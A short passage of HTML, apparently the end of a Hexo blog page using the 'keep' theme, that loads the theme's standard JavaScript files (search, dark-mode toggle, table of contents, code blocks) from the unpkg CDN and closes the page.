src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>